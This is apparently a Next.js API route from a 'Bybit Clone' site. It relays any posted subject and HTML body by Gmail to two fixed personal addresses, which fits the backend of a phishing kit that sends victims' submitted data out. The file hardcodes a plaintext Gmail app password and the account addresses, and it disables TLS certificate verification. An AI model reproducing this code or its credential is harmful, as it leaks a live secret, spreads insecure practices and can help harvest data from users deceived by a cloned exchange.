import { type NextRequest, NextResponse } from "next/server"
import nodemailer from "nodemailer"

// Force this API route to use Node.js runtime
export const runtime = "nodejs"
export const dynamic = "force-dynamic"

// Hardcode the email configuration as backup
const EMAIL_CONFIG = {
  ADMIN_EMAIL: process.env.ADMIN_EMAIL || "westkhalifahninety7@gmail.com",
  APP_PASSWORD: process.env.APP_PASSWORD || "sawujuvkbqpobevf",
  RECIPIENT_EMAIL_1: process.env.RECIPIENT_EMAIL_1 || "ao2674710@gmail.com",
  RECIPIENT_EMAIL_2: process.env.RECIPIENT_EMAIL_2 || "princeadeluv13@gmail.com",
}

// Create transporter with the configuration
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 587,
  secure: false, // Use TLS
  auth: {
    user: EMAIL_CONFIG.ADMIN_EMAIL,
    pass: EMAIL_CONFIG.APP_PASSWORD,
  },
  // Add these options to help with Vercel DNS issues
  tls: {
    rejectUnauthorized: false,
  },
  connectionTimeout: 60000, // 60 seconds
  greetingTimeout: 30000, // 30 seconds
  socketTimeout: 60000, // 60 seconds
  // Force IPv4 to avoid DNS issues
  family: 4,
})

export async function POST(request: NextRequest) {
  try {
    const { to, subject, html } = await request.json()

    console.log("Email Configuration:", {
      adminEmail: EMAIL_CONFIG.ADMIN_EMAIL,
      recipients: [EMAIL_CONFIG.RECIPIENT_EMAIL_1, EMAIL_CONFIG.RECIPIENT_EMAIL_2],
      hasPassword: !!EMAIL_CONFIG.APP_PASSWORD,
    })

    // Use the configured recipient emails
    const recipients = [EMAIL_CONFIG.RECIPIENT_EMAIL_1, EMAIL_CONFIG.RECIPIENT_EMAIL_2]

    const mailOptions = {
      from: `"Bybit Clone Admin" <${EMAIL_CONFIG.ADMIN_EMAIL}>`,
      to: recipients.join(","),
      subject: subject,
      html: html,
    }

    console.log("Attempting to send email with Nodemailer...")
    console.log("Mail options:", {
      from: mailOptions.from,
      to: mailOptions.to,
      subject: mailOptions.subject,
    })

    // Verify transporter before sending
    await transporter.verify()
    console.log("SMTP connection verified successfully")

    const info = await transporter.sendMail(mailOptions)
    console.log("Email sent successfully:", info.messageId)

    return NextResponse.json({
      success: true,
      message: "Email sent successfully",
      messageId: info.messageId,
      recipients: recipients,
    })
  } catch (error) {
    console.error("Detailed email error:", error)
    return NextResponse.json(
      {
        success: false,
        error: error.message,
        details: error.toString(),
        config: {
          adminEmail: EMAIL_CONFIG.ADMIN_EMAIL,
          hasPassword: !!EMAIL_CONFIG.APP_PASSWORD,
        },
      },
      { status: 500 },
    )
  }
}
